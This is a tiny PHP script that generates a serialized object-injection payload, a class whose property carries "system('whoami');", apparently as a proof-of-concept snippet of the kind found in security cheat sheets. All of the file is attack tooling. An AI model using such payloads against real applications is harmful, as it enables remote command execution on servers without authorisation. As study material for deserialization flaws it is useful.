<?php
class PHPObjectInjection{
    public $inject = "system('whoami');";
}
$obj = new PHPObjectInjection;
$serialized = serialize($obj);
echo $serialized;

?>